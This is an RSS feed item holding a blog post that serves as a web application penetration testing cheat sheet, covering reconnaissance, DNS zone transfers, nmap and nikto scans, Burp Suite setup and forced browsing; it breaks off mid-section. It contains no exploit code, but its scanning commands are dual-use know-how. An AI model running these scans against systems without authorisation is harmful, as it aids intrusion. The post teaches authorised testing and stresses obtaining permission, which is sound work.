<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Web Application Penetration Testing Cheat Sheet</title>
<link>https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/</link>
<guid isPermaLink="true" >https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/</guid>
<description>&lt;p&gt;This cheatsheet is intended to run down the typical steps performed when conducting a web application penetration test. I will break these steps down into sub-tasks and describe the tools I recommend using at each level.&lt;/p&gt;
&lt;p&gt;Many of the ideas presented in this sheet come from the &lt;strong&gt;fantastic&lt;/strong&gt; teachings of &lt;a href=&quot;https://lanmaster53.com/&quot;&gt;Tim “lanmaster53” Tomes&lt;/a&gt;, who has kindly allowed me to share them with you here. If you or anyone you know is interested in web application penetration testing &lt;a href=&quot;https://lanmaster53.com/training&quot;&gt;Training&lt;/a&gt; I &lt;strong&gt;highly&lt;/strong&gt; recommend that you or your company consider Tim.&lt;/p&gt;
&lt;p&gt;Please bear in mind that these steps are &lt;strong&gt;iterative&lt;/strong&gt; so in a typical engagement you can expect to do them multiple times. This is particularly true if you manage to traverse different levels of access in an application (e.g. elevate from a regular user to an admin).&lt;/p&gt;
&lt;p&gt;Finally, throughout this sheet I will heavily discuss tools included in PortSwigger’s &lt;a href=&quot;https://portswigger.net/burp&quot;&gt;Burp Suite Professional&lt;/a&gt; which is a paid product intended for professional use. I apologize if this dissuades you, but at the price they offer the tool for I consider it a bargain.&lt;/p&gt;
&lt;h2 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h2&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;In an engagement the goal of information gathering is to gain an understanding of the application from an &lt;strong&gt;outsiders perspective.&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;target-validation&quot;&gt;Target Validation&lt;/h3&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Tool&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;5.3086956521739&quot;&gt;&lt;tr readability=&quot;6&quot;&gt;&lt;td&gt;Whois&lt;/td&gt;
&lt;td&gt;A protocol for searching internet registration databases based on RFC 3912 for domain names, IPs, autonomous systems, etc.&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;Dig&lt;/td&gt;
&lt;td&gt;dig (domain information groper) is a network administration command-line tool for querying Domain Name System (DNS) servers.&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;1.7241379310345&quot;&gt;&lt;td&gt;DNSRecon&lt;/td&gt;
&lt;td&gt;Tool for automating many DNS enumeration techniques maintained by &lt;a href=&quot;https://github.com/darkoperator/dnsrecon&quot;&gt;darkoperator&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h4 id=&quot;domain-registration&quot;&gt;Domain Registration&lt;/h4&gt;
&lt;p&gt;Use the following steps to validate ownership of a target:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Whois the target domains/hosts.
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;whois example.com
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;Resolve the IP addresses for the target domains/hosts.
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;dig +short example.com
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;Whois the IP addresses.
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;whois 104.27.178.12
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;Analyze the results.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Results could be mixed depending on whether or not the target is using whois privacy protection.&lt;/p&gt;
&lt;div class=&quot;note warning&quot; readability=&quot;9&quot;&gt;
&lt;h5&gt;Never attack a target that you are not positive you have permission to be testing&lt;/h5&gt;
&lt;p&gt;As a penetration tester it is your responsibility to ensure that you have permission from the owner of a target before you start testing it. This is why target validation should always be your first step when beginning an engagement.&lt;/p&gt;
&lt;/div&gt;
&lt;h4 id=&quot;dns-interrogation&quot;&gt;DNS Interrogation&lt;/h4&gt;
&lt;p&gt;I like to start off with &lt;a href=&quot;https://dnsdumpster.com/&quot;&gt;https://dnsdumpster.com/&lt;/a&gt; which is a great online tool for getting a quick overview of a target domain’s internet footprint via DNS.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Forward Lookups
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;dig +nocmd example.com A +noall +answer
dig +nocmd example.com NS +noall +answer
dig +nocmd example.com MX +noall +answer
dig +nocmd example.com TXT +noall +answer
dig +nocmd example.com SOA +noall +answer
...
dig +nocmd example.com ANY +noall +answer (This rarely works)
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;Reverse Lookups
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;dig -x 104.27.179.12
dig -x 104.27.178.12
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;testing-for-zone-transfers&quot;&gt;Testing for Zone Transfers&lt;/h4&gt;
&lt;p&gt;Zone transfers are a DNS transaction used to replicate records between DNS servers. It’s rare to find a DNS server these days that allow a zone transfer, but it’s something you should check. If you succeed in performing a zone transfer, you stand to gain access to all of the records of a domain.&lt;/p&gt;
&lt;div class=&quot;note important&quot; readability=&quot;8&quot;&gt;
&lt;h5&gt;DNS Zone Transfer Attacks are &lt;strong&gt;EASY&lt;/strong&gt; to prevent!&lt;/h5&gt;
&lt;p&gt;At the bare-minimum an administrator can whitelist zone transfers to a select group of IP addresses.&lt;/p&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;Example using
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;dig -t NS zonetransfer.me +short
dig -t AXFR zonetransfer.me @nsztm1.digi.ninja 
dig -t AXFR zonetransfer.me @nsztm2.digi.ninja
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;DNSRecon is useful for automating many of the DNS enumeration tasks above, and can often find extra information that may have been missed.
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;dnsrecon -d example.com
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;osint-harvesting&quot;&gt;OSINT Harvesting&lt;/h3&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Tool&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;6.1852300242131&quot;&gt;&lt;tr readability=&quot;3.448275862069&quot;&gt;&lt;td&gt;Recon-NG&lt;/td&gt;
&lt;td&gt;Open source reconnaissance framework created by Tim 'Lanmaster53' Tomes, maintained by a community of developers on &lt;a href=&quot;http://recon-ng.com/&quot;&gt;http://recon-ng.com/&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Maltego&lt;/td&gt;
&lt;td&gt;Maltego is an interactive data mining tool that renders directed graphs for link analysis.&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;7&quot;&gt;&lt;td&gt;theharvester&lt;/td&gt;
&lt;td&gt;theHarvester is a tool for gathering e-mail accounts, subdomain names, virtual hosts, open ports/ banners, and employee names from different public sources&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;I thought about including a detailed section on OSINT in this cheat sheet, but at this time I’ve decided not to since I believe it deserves its own cheat sheet (perhaps later down the line).&lt;/p&gt;
&lt;p&gt;Instead I’d like to point you towards some excellent resources on OSINT that I think all pentesters should familiarize themselves with.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Michael Bazzell
&lt;/li&gt;
&lt;li&gt;Google Dorking
&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;mapping&quot;&gt;Mapping&lt;/h2&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;In an engagement the goal of mapping is to gain an understanding of the application from a typical users perspective.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;identify-technologies&quot;&gt;Identify Technologies&lt;/h3&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Tool&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;NMap&lt;/td&gt;
&lt;td&gt;TCP/IP host and port scanning tool with fantastic service and OS fingerprinting capabilities.&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h4 id=&quot;port-scanning-service-fingerprinting-and-os-detection&quot;&gt;Port Scanning, Service Fingerprinting, and OS Detection&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;Port scans top 1000 TCP ports.
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;nmap 192.168.100.2
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;Ping sweep 8 localhost addresses (actually does an ARP, ICMP, then TCP 80)
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;nmap –sP 192.168.100.0-7
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;Port scans TCP ports 80 &amp;amp; 443
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;nmap -p 80,443 192.168.100.2
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;Port scans top 1000 TCP ports, fingerprints OS and services, then runs NSE scripts
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;sudo nmap -A 192.168.100.2
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;Port scans all 65535 TCP ports, fingerprints them, and runs NSE scripts
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;sudo nmap –A –p- 192.168.100.2
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;Port scans top 1000 UDP ports
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;sudo nmap -sU 192.168.100.2
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;Port scans all 65535 UDP ports.
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;sudo nmap -sU –p- 192.168.100.2
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;Port scans all 65535 UDP ports, fingerprints them, and runs some NSE scripts.
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;sudo nmap –sU -p- -A 192.168.100.2
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;note info&quot; readability=&quot;9&quot;&gt;
&lt;h5&gt;Port scanning the web server typically marks the transition from information gathering to mapping.&lt;/h5&gt;
&lt;p&gt;Be sure to make note of exposed ports, service versions, and OS/s!&lt;/p&gt;
&lt;/div&gt;
&lt;h3 id=&quot;browser-and-interception-proxy-setup&quot;&gt;Browser and Interception Proxy Setup&lt;/h3&gt;
&lt;h4 id=&quot;firefox&quot;&gt;Firefox&lt;/h4&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Tool&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;Firefox&lt;/td&gt;
&lt;td&gt;Modern, cross-platform, web browser that boasts a large collection of useful extensions.&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Firefox&lt;/code&gt; is typically the default choice in browser when it comes to web application penetration testing. This is namely because of the amount of useful extensions available, and the fact that it doesn’t affect your global proxy settings.&lt;/p&gt;
&lt;h5 id=&quot;firefox-extensions&quot;&gt;Firefox Extensions&lt;/h5&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Tool&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;2.525&quot;&gt;&lt;tr readability=&quot;1.6122448979592&quot;&gt;&lt;td&gt;&lt;a href=&quot;https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/?src=search&quot;&gt;User Agent Switcher&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Firefox addon that allows for quickly changing the browser's user agent string&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;1.8076923076923&quot;&gt;&lt;td&gt;&lt;a href=&quot;https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/&quot;&gt;Wappalyzer&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Browser extension that detects various software components and technologies used on websites.&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;1.5&quot;&gt;&lt;td&gt;&lt;a href=&quot;https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/&quot;&gt;FoxyProxy&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;Web browser proxy switcher&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;These are extensions that I generally use in one way or another in every engagement and I recommend installing them prior to mapping.&lt;/p&gt;
&lt;h5 id=&quot;configure-firefox-for-burp&quot;&gt;Configure Firefox for Burp&lt;/h5&gt;
&lt;p&gt;Before you can begin mapping the application you must first configure your browser to proxy traffic through &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;Firefox&lt;/code&gt;
&lt;ul&gt;&lt;li&gt;Configure the &lt;code class=&quot;highlighter-rouge&quot;&gt;FoxyProxy&lt;/code&gt; extension with a proxy for Burp Suite
&lt;ul&gt;&lt;li&gt;IP: &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Port: &lt;code class=&quot;highlighter-rouge&quot;&gt;8080&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Configure &lt;code class=&quot;highlighter-rouge&quot;&gt;Firefox&lt;/code&gt; to trust Burp’s dynamic SSL certificates
&lt;ul&gt;&lt;li&gt;Open &lt;a href=&quot;http://burp/&quot;&gt;http://burp/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Save the certificate&lt;/li&gt;
&lt;li&gt;Import the certificate into &lt;code class=&quot;highlighter-rouge&quot;&gt;Firefox&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;burp-configuration&quot;&gt;Burp Configuration&lt;/h4&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Tool&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Burp Suite Pro&lt;/td&gt;
&lt;td&gt;Integrated platform for performing security testing of web applications.&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;You should customize Burp so that it suites your preferences. But, at the very least I recommend setting the &lt;code class=&quot;highlighter-rouge&quot;&gt;Scan Speed&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;thorough&lt;/code&gt; since you will typically be using the scanner sparingly and this way it will make more requests and check for more vulnerabilities when it is being used.&lt;/p&gt;
&lt;h5 id=&quot;burp-extensions&quot;&gt;Burp Extensions&lt;/h5&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Tool&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;4.5&quot;&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td&gt;Burp Extender&lt;/td&gt;
&lt;td&gt;API for expanding the functionality of Burp suite, extensions available within the BApp store.&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Retire.js (BApp)&lt;/td&gt;
&lt;td&gt;Burp suite extension used to detect vulnerabilities in outdated JavaScript components.&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Wsdler (BApp)&lt;/td&gt;
&lt;td&gt;Burp suite extension that parses WSDL files to create sample requests for all available methods&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Python Scripter (BApp)&lt;/td&gt;
&lt;td&gt;Executes a custom python script on each HTTP request and response by processed by Burp.&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;These are the &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp&lt;/code&gt; extensions that I typically use in most engagements. Much like the &lt;code class=&quot;highlighter-rouge&quot;&gt;Firefox&lt;/code&gt; extensions I like to have them installed prior to mapping the application.&lt;/p&gt;
&lt;p&gt;These are installed using the &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Extender&lt;/code&gt; module within Burp Suite Pro.&lt;/p&gt;
&lt;h3 id=&quot;manual-mapping&quot;&gt;Manual Mapping&lt;/h3&gt;
&lt;p&gt;Manual enumeration of the web application is perhaps the most important part of the mapping process. It’s imperative that you visit every page, follow every link, and perform every iteration with the application that you possibly can in order to establish a request/response baseline in Burp’s sitemap.&lt;/p&gt;
&lt;div class=&quot;note important&quot; readability=&quot;8&quot;&gt;
&lt;h5&gt;Manual mapping is critical for Single Page Apps&lt;/h5&gt;
&lt;p&gt;Automatic spidering often fails when it comes to mapping single page applications due to the fact that most HTTP requests are sent asynchronously via JavaScript (AJAX).&lt;/p&gt;
&lt;/div&gt;
&lt;h3 id=&quot;automated-mapping&quot;&gt;Automated Mapping&lt;/h3&gt;
&lt;p&gt;Automated Mapping is done using &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Spider&lt;/code&gt; and can be useful in finding additional pages that you normally wouldn’t find during manual enumeration. Typically Burp Spider will find more pages in legacy applications than in more-modern SPAs.&lt;/p&gt;
&lt;div class=&quot;note warning&quot; readability=&quot;9&quot;&gt;
&lt;h5&gt;Automated Spidering is dangerous&lt;/h5&gt;
&lt;p&gt;Depending on the situation I will map anywhere from 80% to 95% of the target application manually and only use the spider in very specific situations. This is because the spider can potentially be destructive in certain situations.&lt;/p&gt;
&lt;/div&gt;
&lt;h3 id=&quot;post-mapping-analysis&quot;&gt;Post-Mapping Analysis&lt;/h3&gt;
&lt;p&gt;At this point you should have the first iteration of the sitemap of the application you’re testing in &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp&lt;/code&gt; and you should make note of what you’ve identified thus far.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Specifics you should make note of:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Web server&lt;/li&gt;
&lt;li&gt;Application Architecture (Tech Stack)&lt;/li&gt;
&lt;li&gt;Programming Language/s&lt;/li&gt;
&lt;li&gt;Frameworks&lt;/li&gt;
&lt;li&gt;Design Patterns&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;This is also a good time to make note of any areas of the application where you are expected to complete a series of actions in a certain order. Oftentimes these processes can be manipulated and executed out of order and can possibly lead to significant findings (e.g. e-commerce checkout experience, password reset form, etc.).&lt;/p&gt;
&lt;h2 id=&quot;discovery&quot;&gt;Discovery&lt;/h2&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;In an engagement the goal of discovery is to gain an understanding of the application from an &lt;strong&gt;attackers perspective.&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;transitioning-from-mapping-to-discovery&quot;&gt;Transitioning from Mapping to Discovery&lt;/h3&gt;
&lt;p&gt;It’s generally time to transition from mapping to discovery after you’ve established your sitemap, and conducted some initial functional analysis of the target. At this point you’re going to be looking to identify as many vulnerabilities in the target application as possible. This includes, not only, &lt;a href=&quot;https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project&quot;&gt;The OWASP Top 10&lt;/a&gt; but also flaws in application business logic. Bear in mind that you will encounter a myriad of vulnerabilities that do not fit nicely into one specific category so you should always be vigilant.&lt;/p&gt;
&lt;h3 id=&quot;content-discovery&quot;&gt;Content Discovery&lt;/h3&gt;
&lt;h4 id=&quot;vulnerability-scanning&quot;&gt;Vulnerability Scanning&lt;/h4&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Nikto&lt;/td&gt;
&lt;td&gt;Web server vulnerability scanner with fantastic fingerprinting capabilities.&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Nikto&lt;/code&gt; is among the best when it comes to vulnerability scanners and does an excellent job at identifying vulnerabilities in the target application. It also has a &lt;code class=&quot;highlighter-rouge&quot;&gt;-Format&lt;/code&gt; switch to easily export the scan results into a format that is easy to read and refer to later on.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Scan the target &amp;amp; output results into HTML format for easier readability.&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;nikto -h http://example.com -output ~/nikto.html -Format htm
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;note info&quot; readability=&quot;8&quot;&gt;
&lt;h5&gt;Vulnerability scanning with Nikto will typically mark the transition from mapping to discovery.&lt;/h5&gt;
&lt;p&gt;Once you have the results of your scan it's important to take the time to review them and visit any page/s that stand out&lt;/p&gt;
&lt;/div&gt;
&lt;h3 id=&quot;forced-browsing&quot;&gt;Forced Browsing&lt;/h3&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;8.5&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Burp Engagement Tools&lt;/td&gt;
&lt;td&gt;A set of special purpose tools built into Burp Suite Pro that apply to specific resources&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;Engagement Tool: Discover Content&lt;/td&gt;
&lt;td&gt;Forced borwsing tool built into Burp Suite Pro&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;Burp Intruder&lt;/td&gt;
&lt;td&gt;Burp suite tool used to automate customized attacks against web applications (e.g. brute forcing, injection, etc.)&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;6&quot;&gt;&lt;td&gt;FuzzDB&lt;/td&gt;
&lt;td&gt;Open source database of malicious inputs, predictable resource names, greppable strings for server response messages, and other resources like web shells&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;Forced browsing is a discovery technique for identifying resources that are not referenced by the target application, but are reachable nonetheless. &lt;code class=&quot;highlighter-rouge&quot;&gt;Discover Content&lt;/code&gt; is a &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp&lt;/code&gt; tool that exists specifically for this purpose. Additionally, &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp Intruder&lt;/code&gt; can also be used for forced browsing by conducting a dictionary attack against the target (usually by injecting into url parameters or file paths). &lt;code class=&quot;highlighter-rouge&quot;&gt;FuzzDB&lt;/code&gt; contains some excellent wordlists for this purpose, specifically take a look at the &lt;a href=&quot;https://github.com/fuzzdb-project/fuzzdb/tree/master/discovery&quot;&gt;discovery&lt;/a&gt; section for wordlists for the purpose of forced browsing.&lt;/p&gt;
&lt;h4 id=&quot;testing-for-alternative-content&quot;&gt;Testing for Alternative Content&lt;/h4&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;6.5&quot;&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;User Agent Switcher&lt;/td&gt;
&lt;td&gt;Firefox addon that allows for quickly changing the browser's user agent string&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;5&quot;&gt;&lt;td&gt;Burp Intruder&lt;/td&gt;
&lt;td&gt;Burp suite tool used to automate customized attacks against web applications (e.g. brute forcing, injection, etc.)&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;6&quot;&gt;&lt;td&gt;FuzzDB&lt;/td&gt;
&lt;td&gt;Open source database of malicious inputs, predictable resource names, greppable strings for server response messages, and other resources like web shells&lt;/td&gt;
